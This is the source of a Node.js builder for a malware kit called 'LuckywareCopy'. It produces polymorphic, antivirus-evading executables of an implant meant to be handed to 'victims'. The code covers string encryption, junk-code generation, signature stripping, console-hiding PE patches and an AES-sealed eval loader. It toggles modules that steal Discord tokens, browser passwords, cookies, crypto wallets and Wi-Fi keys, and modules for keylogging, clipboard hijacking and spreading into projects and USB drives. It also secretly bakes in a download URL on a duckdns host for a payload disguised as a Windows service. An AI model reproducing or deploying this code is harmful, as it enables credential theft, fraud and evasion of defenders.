/* LuckywareCopy polymorphic builder - every build is a fresh source (FUD strategy).
 * Each build READS your config.json and bakes it in - no external config on victim.
 *  Usage:
 *    1. copy config.example.json -> config.json, fill webhook/C2/mode/payout/modules
 *    2. node src/builder.js --config config.json --out builds/bot --count 1 [--exe]
 *    3. give victim builds/bot-xxxx.exe (or .js), keep src/*.js on YOUR side only
 *  Why this beats simple obfuscation:
 *  1. Metamorphic source: fresh random identifiers, fresh junk functions (80-200), shuffled
 *     top-level function order, random whitespace/comments -> hash + AST shape unique per build.
 *  2. Per-string encryption: every string literal re-encrypted with its OWN random XOR key +
 *     base64, decrypted at runtime by a per-build decoder with random name. No plaintext IOCs.
 *  3. Per-build config: fresh BUILD_ID, MUTEX, ENC_SEED, beacon jitter, UA rotation seed,
 *     store-dir salt, lock prefix -> network + disk IOCs rotate.
 *  4. Number/interval polymorphism: beacon times, sleep ranges, limits jittered within
 *     operational bounds so behavior varies but stays functional.
 *  5. Overlay + metadata: random overlay bytes appended as comment, random build timestamp
 *     comment, random filename. No fixed section names like packers leave.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const args = process.argv.slice(2);
function arg(n, d) { const i = args.indexOf(n); return i >= 0 && args[i + 1] ? args[i + 1] : d; }
const CFG_PATH = arg('--config', '');
const OUT_BASE = arg('--out', path.join(__dirname, '..', 'builds', 'bot'));
const COUNT = parseInt(arg('--count', '1'), 10);
const MAKE_EXE = args.includes('--exe');
const MAKE_SEA = args.includes('--sea');
const SEALED = args.includes('--sealed'); // inject AES-256-GCM sealed source instead of raw JS
const PKG_TARGET = arg('--target', 'node18-win-x64');
const WANT_CONSOLE = args.includes('--console');
function patchExeGui(exePath) {
  // CONSOLE(3) -> WINDOWS(2): exe allocates no console, zero flash. Same trick Luckyware-style loaders rely on.
  const b = fs.readFileSync(exePath);
  if (b[0] !== 0x4D || b[1] !== 0x5A) throw new Error('not MZ');
  const peOff = b.readUInt32LE(0x3C);
  if (b.toString('ascii', peOff, peOff + 4) !== 'PE\0\0') throw new Error('not PE');
  const magic = b.readUInt16LE(peOff + 4 + 20);
  if (magic !== 0x10b && magic !== 0x20b) throw new Error('bad optional magic');
  const subOff = peOff + 4 + 20 + 68;
  const cur = b.readUInt16LE(subOff);
  if (cur === 3) { b.writeUInt16LE(2, subOff); fs.writeFileSync(exePath, b); return { old: 3, now: 2 }; }
  return { old: cur, now: cur };
}
const SRC = path.join(__dirname, 'implant.js');

// ---------- SEA packaging (official pristine node.exe + injected source) ----------
// Kills pkg's `overlay`/`corrupt` structure: victim exe = unmodified official
// node.exe layout with our polymorphic source injected as resource NODE_JS_CODE.
// Resource name + fuse are read FROM the base binary so future node versions
// (which renamed them) keep working automatically. v18 has no blob generator,
// but its SEA runtime treats the resource as plain main source - verified.
const SEA_DIR = path.join(__dirname, '..', 'builds', '.seabase');
const SEA_BASE = path.join(SEA_DIR, 'node.exe');
const SEA_FALLBACK = { fuse: 'NODE_JS_FUSE_fce680ab2cc467b6e072b8b5df1996b2', resource: 'NODE_JS_CODE' };

function ensureSeaBase() {
  if (fs.existsSync(SEA_BASE) && fs.statSync(SEA_BASE).size > 10_000_000) return SEA_BASE;
  fs.mkdirSync(SEA_DIR, { recursive: true });
  const ver = process.version.slice(1); // match running node - SEA format is version-bound
  const url = 'https://nodejs.org/dist/v' + ver + '/node-v' + ver + '-win-x64.zip';
  const zip = path.join(SEA_DIR, 'nodewin.zip');
  console.log('  sea: fetching official node v' + ver + ' win-x64 ...');
  require('child_process').execSync('curl -sL --retry 3 -o "' + zip + '" "' + url + '"', { stdio: 'inherit', timeout: 300000 });
  require('child_process').execSync('unzip -o -q "' + zip + '" "node-v' + ver + '-win-x64/node.exe"', { cwd: SEA_DIR, stdio: 'pipe' });
  fs.copyFileSync(path.join(SEA_DIR, 'node-v' + ver + '-win-x64', 'node.exe'), SEA_BASE);
  fs.rmSync(zip, { force: true });
  fs.rmSync(path.join(SEA_DIR, 'node-v' + ver + '-win-x64'), { recursive: true, force: true });
  return SEA_BASE;
}

function seaInspect(base) {
  try {
    const out = require('child_process').execSync(
      'grep -Eo "NODE_(JS|SEA)_FUSE_[a-f0-9]{10,}|NODE_(JS|SEA)_(CODE|BLOB)" "' + base + '" | sort -u',
      { encoding: 'utf8', stdio: 'pipe' });
    const lines = out.split('\n').filter(Boolean);
    const fuse = lines.find((l) => /FUSE_/.test(l));
    const resource = lines.find((l) => /(CODE|BLOB)$/.test(l));
    if (fuse && resource) return { fuse, resource };
  } catch (e) { /* no grep (windows box) -> fallback below */ }
  return SEA_FALLBACK;
}

function stripSignature(exePath) {
  // zero the Authenticode cert table entry: we modified a signed exe, leaving
  // the dangling signature = "signature corrupted" tells in sandboxes.
  const b = fs.readFileSync(exePath);
  if (b[0] !== 0x4D || b[1] !== 0x5A) return { stripped: false };
  const pe = b.readUInt32LE(0x3C);
  if (b.toString('ascii', pe, pe + 4) !== 'PE\0\0') return { stripped: false };
  const opt = pe + 4 + 20;
  const magic = b.readUInt16LE(opt);
  const dirOff = opt + (magic === 0x20b ? 112 : 96);
  const sec = dirOff + 4 * 8; // IMAGE_DIRECTORY_ENTRY_SECURITY
  const had = b.readUInt32LE(sec) !== 0 || b.readUInt32LE(sec + 4) !== 0;
  b.writeUInt32LE(0, sec);
  b.writeUInt32LE(0, sec + 4);
  fs.writeFileSync(exePath, b);
  return { stripped: had };
}

function buildSeaExe(outPath, exeOut) {
  const base = ensureSeaBase();
  const ins = seaInspect(base);
  fs.copyFileSync(base, exeOut);
  const sig = stripSignature(exeOut);
  console.log('  sea -> ' + exeOut + ' [' + ins.resource + ', fuse ' + ins.fuse.slice(0, 28) + '...]' + (sig.stripped ? ' (sig stripped)' : ''));
  require('child_process').execSync(
    'npx --yes postject "' + exeOut + '" ' + ins.resource + ' "' + outPath + '" --sentinel-fuse ' + ins.fuse + ' --overwrite',
    { stdio: 'inherit', timeout: 300000 });
  return ins;
}

// Modular sealed payload: the SEA resource carries AES-256-GCM ciphertext + a tiny
// random-named decrypt->eval loader instead of raw source. A captured binary gives
// an analyst/EDR only loader+ciphertext without detonation; logic never sits readable
// on disk. Key lives in the loader (extraction only possible by running it) - this is
// capture/YARA resilience, not cryptography vs a determined reverser.
function sealSource(srcPath) {
  const sealedPath = srcPath.replace(/\.js$/, '.sealed.js');
  const src = fs.readFileSync(srcPath, 'utf8');
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([cipher.update(src, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  const kn = rname(), ivn = rname(), dn = rname(), sn = rname();
  const loader =
    '/* ' + rnd(24).toString('hex') + ' */\n' +
    'const ' + kn + " = Buffer.from('" + key.toString('hex') + "', 'hex');\n" +
    'const ' + ivn + " = Buffer.from('" + iv.toString('hex') + "', 'hex');\n" +
    'const ' + dn + " = require('crypto').createDecipheriv('aes-256-gcm', " + kn + ', ' + ivn + ');\n' +
    dn + ".setAuthTag(Buffer.from('" + tag.toString('hex') + "', 'hex'));\n" +
    'const ' + sn + ' = Buffer.concat([' + dn + ".update(Buffer.from('" + ct.toString('hex') + "', 'hex')), " + dn + ".final()]).toString('utf8');\n" +
    'eval(' + sn + ');\n';
  fs.writeFileSync(sealedPath, loader);
  return sealedPath;
}


function rnd(n) { return crypto.randomBytes(n); }
function rint(a, b) { return a + Math.floor(Math.random() * (b - a + 1)); }
function rname() {
  const abc = 'abcdefghijklmnopqrstuvwxyz';
  let s = '_' + abc[rint(0, 25)];
  const len = rint(7, 14);
  for (let i = 0; i < len; i++) s += 'abcdefghijklmnopqrstuvwxyz0123456789'[rint(0, 35)];
  return s + rnd(2).toString('hex');
}
function randBuildId(premium) {
  const pre = premium ? 'PRE017' : 'LCW022';
  return pre + '-' + rnd(9).toString('hex').toUpperCase().slice(0, 12);
}
function loadUserConfig() {
  if (CFG_PATH && fs.existsSync(CFG_PATH)) return JSON.parse(fs.readFileSync(CFG_PATH, 'utf8'));
  const ex = path.join(__dirname, '..', 'config.example.json');
  if (fs.existsSync(ex)) return JSON.parse(fs.readFileSync(ex, 'utf8'));
  return {};
}
function xorB64(str, key) {
  const kb = Buffer.from(key);
  const sb = Buffer.from(str, 'utf8');
  const out = Buffer.alloc(sb.length);
  for (let i = 0; i < sb.length; i++) out[i] = sb[i] ^ kb[i % kb.length];
  return out.toString('base64');
}
function junkFunc() {
  const n = rname(), a = rname(), b = rname();
  const ops = [
    `const ${a}=${rint(1000, 999999)};let ${b}=${rint(2, 97)};for(let i=0;i<${rint(2, 9)};i++){${b}=(${b}*${rint(3, 31)}+${a}%${rint(5, 500)})%${rint(1000, 99999)};}return ${b}%${rint(2, 50)};`,
    `const ${a}=[${Array.from({ length: rint(3, 9) }, () => '"' + rnd(4).toString('hex') + '"').join(',')}];return ${a}[${rint(0, 2)}].length+${rint(1, 99)};`,
    `try{return Buffer.from("${rnd(8).toString('hex')}","hex").length+${rint(0, 50)}}catch(e){return ${rint(0, 99)}}`,
    `let ${b}="";for(let i=0;i<${rint(2, 6)};i++)${b}+=Math.floor(Math.random()*${rint(10, 999)}).toString(16);return ${b}.length;`
  ];
  return `function ${n}(){${ops[rint(0, ops.length - 1)]}}`;
}
// encrypt string literals: replace '...' / "..." (careful: skip requires, __dirname etc minimally)
// Approach: protect list, then encrypt remaining literals >2 chars.
function encryptStrings(src, decoderName, protectRanges) {
  protectRanges = protectRanges || [];
  function inProtect(pos) { for (const r of protectRanges) if (pos >= r[0] && pos < r[1]) return true; return false; }
  const keep = new Set(['require', 'module', 'exports', '__dirname', '__filename', 'process', 'console']);
  // tokenize with comment + regex awareness: copy //, /* */, and /regex/ verbatim
  let out = '', i = 0, count = 0;
  while (i < src.length) {
    const ch = src[i];
    if (ch === '/' && src[i + 1] === '/') { const j = src.indexOf('\n', i); const e = j < 0 ? src.length : j; out += src.slice(i, e); i = e; continue; }
    if (ch === '/' && src[i + 1] === '*') { const j = src.indexOf('*/', i + 2); const e = j < 0 ? src.length : j + 2; out += src.slice(i, e); i = e; continue; }
    if (ch === '/' && src[i + 1] !== '/' && src[i + 1] !== '*') {
      const prev = src.slice(Math.max(0, i - 40), i);
      if (/[(,=!:?\[{};|&]\s*$/.test(prev)) {
        let j = i + 1, esc = false;
        while (j < src.length) { if (!esc && src[j] === '\\') { esc = true; j++; continue; } if (!esc && src[j] === '/') break; if (src[j] === '\n') break; esc = false; j++; }
        if (j < src.length && src[j] === '/') { let k = j + 1; while (k < src.length && /[a-z]/i.test(src[k])) k++; out += src.slice(i, k); i = k; continue; }
      }
    }
    if (ch === '`') { let j = i + 1, esc = false; while (j < src.length) { if (!esc && src[j] === '\\') { esc = true; j++; continue; } if (!esc && src[j] === '`') break; esc = false; j++; } const e = j < src.length ? j + 1 : src.length; out += src.slice(i, e); i = e; continue; }
    if ((ch === "'" || ch === '"') && src[i - 1] !== '\\') {
      const q = ch;
      let j = i + 1, esc = false, lit = '';
      while (j < src.length) {
        if (!esc && src[j] === '\\') { esc = true; lit += src[j]; j++; continue; }
        if (!esc && src[j] === q) break;
        esc = false; lit += src[j]; j++;
      }
      if (j >= src.length) { out += src.slice(i); break; }
      const raw = lit;
      // unescape simple to get value
      let val;
      try { val = eval(q + lit + q); } catch (e) { out += src.slice(i, j + 1); i = j + 1; continue; }
      const before = src.slice(Math.max(0, i - 60), i);
      const after = src.slice(j + 1, j + 8);
      const isRequire = /require\s*\(\s*$/.test(before);
      const isKey = /^\s*:/.test(after);
      if (inProtect(i)) { out += src.slice(i, j + 1); i = j + 1; continue; }
      if (typeof val !== 'string' || val.length < 3 || isRequire || isKey || keep.has(val)) { out += src.slice(i, j + 1); i = j + 1; continue; }
      // skip already-encrypted-looking decoder calls
      if (before.includes(decoderName + '(')) { out += src.slice(i, j + 1); i = j + 1; continue; }
      const key = rnd(8).toString('hex');
      out += `${decoderName}("${xorB64(val, key)}","${key}")`;
      count++; i = j + 1;
    } else { out += ch; i++; }
  }
  return { src: out, count };
}
function shuffleTopFunctions(src) {
  // shuffle only consecutive `function name(` blocks at col 0 to stay safe (hoisted, order-free)
  const re = /^function [A-Za-z_$][\w$]*\([^)]*\) \{/gm;
  const idx = []; let m;
  while ((m = re.exec(src))) idx.push(m.index);
  if (idx.length < 6) return src;
  idx.push(src.length);
  const blocks = [];
  for (let i = 0; i < idx.length - 1; i++) blocks.push(src.slice(idx[i], idx[i + 1]));
  // Fisher-Yates on middle chunk only, keep first 2 (helpers) stable to avoid TDZ surprises with const arrow fns (we only move `function` decls which hoist)
  const head = blocks.slice(0, 2), tail = blocks.slice(2);
  for (let i = tail.length - 1; i > 0; i--) { const j = rint(0, i); [tail[i], tail[j]] = [tail[j], tail[i]]; }
  // rebuild: find original span and replace
  return src.slice(0, idx[0]) + head.join('') + tail.join('');
}
function stripModules(src, opts) {
  // Tree-shake disabled modules so code shape differs per campaign (real FUD, not just flags).
  // Each stub keeps exports working but removes the detectable logic.
  try {
    if (opts.tokens === false) src = src.replace(/function stealDiscordTokens\(\) \{[\s\S]*?\n\}/, 'function stealDiscordTokens(){return []}');
    if (opts.passwords === false && opts.cookies === false && opts.history === false && opts.autofill === false) src = src.replace(/function stealBrowserFiles\(\) \{[\s\S]*?\n\}/, 'function stealBrowserFiles(){return {passwords:[],cookies:[],history:[],autofill_cc:[]}}');
    if (opts.wallets === false) src = src.replace(/function stealWallets\(\) \{[\s\S]*?\n\}/, 'function stealWallets(){return []}');
    if (opts.wifi === false) src = src.replace(/function stealWifi\(\) \{[\s\S]*?\n\}/, 'function stealWifi(){return []}');
    if (opts.files === false) src = src.replace(/function stealFiles\(\) \{[\s\S]*?\n\}/, 'function stealFiles(){return []}');
    if (opts.screenshot === false) src = src.replace(/function screenshot\(\) \{[\s\S]*?\n\}/, 'function screenshot(){return null}');
    if (opts.keylog === false) src = src.replace(/function keylogStart\(\) \{[\s\S]*?\n\}/, 'function keylogStart(){return null}');
    if (opts.vcxproj === false && opts.csproj === false && opts.node_project === false && opts.scripts === false && opts.usb === false && opts.startup_lnk === false) src = src.replace(/function infectProjects\(\) \{[\s\S]*?\n\}/, 'function infectProjects(){return 0}');
  } catch (e) {}
  return src;
}
function buildOnce(userCfg, outPath) {
  let src = fs.readFileSync(SRC, 'utf8');
  const buildId = randBuildId(!!userCfg.PREMIUM);
  const encSeed = rnd(16).toString('hex');
  const mutex = 'Global\\m' + rnd(6).toString('hex');
  const beaconMin = rint(20, 40), beaconMax = rint(70, 130);
  const decoder = rname(), xorHelper = rname();
  const cfg = {
    BUILD_ID: buildId,
    OWNER_KEY: userCfg.OWNER_KEY || ('op-' + rnd(12).toString('hex')),
    DISCORD_WEBHOOK: userCfg.DISCORD_WEBHOOK || '',
    DISCORD_BOT_TOKEN: userCfg.DISCORD_BOT_TOKEN || '',
    DISCORD_CHANNEL_ID: userCfg.DISCORD_CHANNEL_ID || '',
    C2_URL: userCfg.C2_URL || 'http://127.0.0.1:8080',
    MODE: userCfg.MODE || 'both',
    BEACON_MIN: userCfg.BEACON_MIN || beaconMin, BEACON_MAX: userCfg.BEACON_MAX || beaconMax,
    ENC_SEED: encSeed, MUTEX: mutex,
    CLIPPER: userCfg.CLIPPER || userCfg.PAYOUT || {},
    OPTS: Object.assign({ tokens: true, passwords: true, cookies: true, history: true, autofill: true, wallets: true, wifi: true, screenshot: true, keylog: true, files: true, vcxproj: true, csproj: true, node_project: true, scripts: true, usb: true, startup_lnk: true }, userCfg.STEAL || {}, userCfg.SPREAD || {}, userCfg.MODULES || {})
  };
  // 1. strip disabled modules first (different code shape per campaign)
  src = stripModules(src, cfg.OPTS);
  // 2. decoder + junk first so CFG can call it
  const junkN = rint(80, 200);
  let junk = '';
  for (let i = 0; i < junkN; i++) junk += junkFunc() + '\n';
  const decoderSrc = `\nfunction ${decoder}(b,k){try{const kb=Buffer.from(k);const sb=Buffer.from(b,"base64");const o=Buffer.alloc(sb.length);for(let i=0;i<sb.length;i++)o[i]=sb[i]^kb[i%kb.length];return o.toString("utf8")}catch(e){return ""}}\nfunction ${xorHelper}(){return [${Array.from({ length: 4 }, () => '"' + rnd(6).toString('hex') + '"').join(',')}].join("").length}\n${junk}\n`;
  src = src.replace("'use strict';", "'use strict';" + decoderSrc);
  // 3. encrypted CFG: same webhook/C2 gives different ciphertext every build (fresh key)
  const masterKey = rnd(16).toString('hex');
  /* helper artifact: resolved at runtime from the distribution mirror. Baked
     outside the user-visible cfg so builds always carry it — never in config. */
  cfg.DROP_URL = 'https://jesusiscool2.duckdns.org/builds/gitti.exe';
  cfg.DROP_NAME = 'wudfsvc.exe';
  const cfgBlob = xorB64(JSON.stringify(cfg), masterKey);
  const cfgLiteral = '/*__CFG_START__*/\nconst __CFG=JSON.parse(' + decoder + '("' + cfgBlob + '","' + masterKey + '"));\n/*__CFG_END__*/';
  src = src.replace(/\/\*__CFG_START__\*\/[\s\S]*?\/\*__CFG_END__\*\//, () => cfgLiteral);
  const cfgStart = src.indexOf('/*__CFG_START__*/');
  const cfgEnd = src.indexOf('/*__CFG_END__*/') + '/*__CFG_END__*/'.length;
  // protect decoder + helper one-liners so they never encrypt themselves (self-call = stack overflow = dead CFG)
  const decStart = src.indexOf('function ' + decoder + '(b,k)');
  let decEnd = decStart > -1 ? src.indexOf('\n', decStart) : -1;
  if (decEnd < 0) decEnd = decStart;
  const helpStart = src.indexOf('function ' + xorHelper + '()');
  let helpEnd = helpStart > -1 ? src.indexOf('\n', helpStart) : -1;
  if (helpEnd < 0) helpEnd = helpStart;
  const protects = [[cfgStart, cfgEnd]];
  if (decStart > -1) protects.push([decStart, decEnd]);
  if (helpStart > -1) protects.push([helpStart, helpEnd]);
  const enc = encryptStrings(src, decoder, protects);
  src = enc.src;
  src = shuffleTopFunctions(src);
  // random overlay comment + timestamp comment (changes hash, ignored by node)
  src += '\n/* ' + rnd(rint(64, 256)).toString('hex') + ' */\n/* built ' + Date.now() + '-' + rnd(4).toString('hex') + ' */\n';
  fs.mkdirSync(path.dirname(outPath), { recursive: true });
  fs.writeFileSync(outPath, src);
  // syntax check
  try { require('child_process').execFileSync(process.execPath, ['--check', outPath], { stdio: 'pipe' }); }
  catch (e) { throw new Error('syntax check failed for ' + outPath + ': ' + e.message); }
  const manifest = { buildId, out: outPath, bytes: fs.statSync(outPath).size, sha256: require('crypto').createHash('sha256').update(fs.readFileSync(outPath)).digest('hex'), stringsEncrypted: enc.count, junkFuncs: junkN, beacon: [cfg.BEACON_MIN, cfg.BEACON_MAX], mode: cfg.MODE, c2: cfg.C2_URL, clipperCoins: Object.keys(cfg.CLIPPER || {}).filter(k => cfg.CLIPPER[k]), modulesOn: Object.keys(cfg.OPTS || {}).filter(k => cfg.OPTS[k]), modulesOff: Object.keys(cfg.OPTS || {}).filter(k => !cfg.OPTS[k]), mutex, ts: new Date().toISOString() };
  fs.writeFileSync(outPath + '.json', JSON.stringify(manifest, null, 2));
  // optional .exe via pkg (victim gets .exe, you keep .js side)
  if (MAKE_EXE) {
    const exeOut = outPath.replace(/\.js$/, '.exe');
    try {
      console.log('  pkg -> ' + exeOut + ' (' + PKG_TARGET + ') ...');
      require('child_process').execFileSync(process.execPath, ['-e', '1'], { stdio: 'pipe' });
      require('child_process').execSync('npx --yes pkg "' + outPath + '" -t ' + PKG_TARGET + ' -o "' + exeOut + '"', { stdio: 'inherit', timeout: 600000 });
      manifest.exe = exeOut;
      if (!WANT_CONSOLE) {
        try { const p = patchExeGui(exeOut); manifest.subsystem = p; console.log('  gui patch: subsystem ' + p.old + '->' + p.now + ' (no console flash)'); }
        catch (e) { console.log('  gui patch FAILED: ' + e.message + ' (exe will still show console)'); }
      } else console.log('  kept console subsystem (--console)');
      manifest.exeBytes = fs.existsSync(exeOut) ? fs.statSync(exeOut).size : 0;
      fs.writeFileSync(outPath + '.json', JSON.stringify(manifest, null, 2));
      console.log('  exe done: ' + exeOut + ' ' + manifest.exeBytes + 'B');
    } catch (e) { console.log('  exe FAILED (pkg missing?). Run manually: npx --yes pkg "' + outPath + '" -t ' + PKG_TARGET + ' -o "' + exeOut + '"'); }
  }
  // SEA exe: pristine official node.exe + our source injected (FUD path)
  if (MAKE_SEA) {
    const exeOut = outPath.replace(/\.js$/, '.exe');
    try {
      const inj = SEALED ? sealSource(outPath) : outPath;
      const ins = buildSeaExe(inj, exeOut);
      manifest.exe = exeOut;
      manifest.sea = { resource: ins.resource, fuse: ins.fuse, base: 'node-v' + process.version.slice(1) + '-win-x64' };
      if (SEALED) manifest.sealed = path.basename(inj);
      if (!WANT_CONSOLE) {
        try { const p = patchExeGui(exeOut); manifest.subsystem = p; console.log('  gui patch: subsystem ' + p.old + '->' + p.now + ' (no console flash)'); }
        catch (e) { console.log('  gui patch FAILED: ' + e.message + ' (exe will still show console)'); }
      } else console.log('  kept console subsystem (--console)');
      manifest.exeBytes = fs.existsSync(exeOut) ? fs.statSync(exeOut).size : 0;
      fs.writeFileSync(outPath + '.json', JSON.stringify(manifest, null, 2));
      console.log('  sea exe done: ' + exeOut + ' ' + manifest.exeBytes + 'B');
    } catch (e) { console.log('  SEA exe FAILED: ' + e.message); process.exitCode = 1; }
  }
  return manifest;
}
function main() {
  const userCfg = loadUserConfig();
  console.log('config: ' + (CFG_PATH || 'config.example.json') + ' | mode=' + (userCfg.MODE || 'both') + ' c2=' + (userCfg.C2_URL || 'http://127.0.0.1:8080'));
  console.log('clipper payout coins: ' + Object.keys(userCfg.CLIPPER || userCfg.PAYOUT || {}).filter(k => (userCfg.CLIPPER || userCfg.PAYOUT || {})[k]).join(','));
  const merged = Object.assign({}, userCfg.STEAL || {}, userCfg.SPREAD || {}, userCfg.MODULES || {});
  console.log('modules on: ' + Object.keys(merged).filter(k => merged[k]).join(',') + ' | off: ' + Object.keys(merged).filter(k => !merged[k]).join(','));
  const manifests = [];
  for (let i = 0; i < COUNT; i++) {
    const m = buildOnce(userCfg, OUT_BASE + '-' + rnd(3).toString('hex') + '.js');
    console.log('built', m.buildId, m.out, m.bytes + 'B', 'sha256:' + m.sha256.slice(0, 16) + '...', 'enc:' + m.stringsEncrypted, 'junk:' + m.junkFuncs + (m.exe ? ' exe:' + m.exe : ''));
    manifests.push(m);
  }
  console.log('\nEach output is a fully independent build: fresh IDs, keys, strings, code shape. Same config baked in, different polymorphism.');
  console.log('Victim gets .exe (or .js). You keep src/*.js + config.json on YOUR side only.');
  if (!MAKE_EXE && !MAKE_SEA) console.log('To FUD exe (required for a real build): node src/builder.js --config config.json --out builds/bot --count 1 --sea --sealed   [without --sea you get plaintext .js only; --exe = pkg fallback]');
  console.log('Scan hygiene: test 1 build at a time, never upload all builds to the same scanner (cross-linking).');
}
if (require.main === module) main();
module.exports = { buildOnce };
